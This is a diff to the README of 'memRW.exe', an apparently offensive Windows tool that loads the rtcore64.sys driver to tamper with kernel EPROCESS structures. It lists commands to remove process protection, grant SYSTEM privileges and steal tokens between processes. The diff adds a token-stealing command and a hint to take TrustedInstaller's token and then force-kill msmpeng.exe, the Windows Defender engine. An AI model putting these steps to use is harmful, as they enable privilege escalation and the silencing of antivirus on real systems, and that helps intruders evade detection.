@@ -5,12 +5,15 @@ For now, playing with EPROCESS :</br>
 -stealing system token</br>
 </br>
 
-memRW.exe load %cd%\rtcore64.sys</br>
+memRW.exe load "%cd%\rtcore64.sys"</br>
 memRW.exe list</br>
 memRW.exe removeppl PID</br>
 memRW.exe makesystem PID</br>
-memRW.exe unload %cd%\rtcore64.sys</br>
+memRW.exe stealtoken from_pid to_pid</br>
+memRW.exe unload "%cd%\rtcore64.sys"</br>
 </br>
+
+Hint : stealtoken from trustedinstaller.exe (net start) and taskkill /f /im msmpeng.exe.
 
 Greatly inspired by https://github.com/RedCursorSecurityConsulting/PPLKiller </br>
 
